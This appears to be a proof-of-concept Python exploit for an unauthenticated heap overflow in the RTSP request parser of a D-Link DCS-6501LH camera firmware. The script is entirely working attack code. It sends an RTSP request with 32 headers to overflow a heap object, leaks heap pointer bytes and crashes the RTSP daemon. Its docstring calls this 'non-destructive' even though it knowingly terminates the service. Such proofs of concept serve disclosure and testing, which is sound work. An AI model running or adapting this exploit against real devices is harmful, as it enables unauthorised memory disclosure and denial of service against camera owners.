#!/usr/bin/env python3
"""Proof of concept for the unauthenticated heap overflow in the RTSP
request parser of D-Link DCS-6501LH firmware V3.03.02 (aoni_ipc).

The RTSP parser stores every request header in a fixed 276-byte heap
object without limiting the header count.  The 32nd header therefore
writes past the end of the allocation, corrupting the adjacent heap
object, which is visible as heap pointer bytes at the start of the RTSP
response; the daemon then aborts on heap corruption.

Non-destructive: it only sends RTSP requests, changes no configuration
and stores nothing on the device.

Usage:
    python3 poc.py <host> [port]
"""
import socket
import sys

PORT = 554


def build_request(header_count, cseq):
    lines = [
        "OPTIONS rtsp://%s:%d/ RTSP/1.0" % (HOST, PORT),
        "CSeq: %d" % cseq,
    ]
    for i in range(header_count):
        lines.append("X%d: v%d" % (i, i))
    return ("\r\n".join(lines) + "\r\n\r\n").encode()


def send(payload, read=600):
    sock = socket.create_connection((HOST, PORT), 5)
    try:
        sock.sendall(payload)
        sock.settimeout(5)
        chunks = []
        try:
            while len(chunks) < read:
                data = sock.recv(read - len(chunks))
                if not data:
                    break
                chunks.append(data)
        except socket.timeout:
            pass
        return b"".join(chunks)
    finally:
        sock.close()


def show(label, data):
    print("[*] %s: %d bytes" % (label, len(data)))
    if data:
        print("    hex  : %s" % data[:24].hex(" "))
        print("    ascii: %r" % data[:24])
        ok = data.startswith(b"RTSP/1.0")
        print("    starts with a valid RTSP status line: %s" % ok)
    else:
        print("    no response")


def main():
    global HOST, PORT
    HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 554

    print("[*] target %s:%d" % (HOST, PORT))
    show("control (31 headers)", send(build_request(31, 7)))
    show("overflow (32 headers)", send(build_request(32, 8)))
    print("[!] On a vulnerable device the second response starts with heap")
    print("    pointer bytes instead of 'RTSP/1.0' and the RTSP daemon")
    print("    terminates (SIGABRT, heap corruption).")


if __name__ == "__main__":
    HOST = "127.0.0.1"
    main()
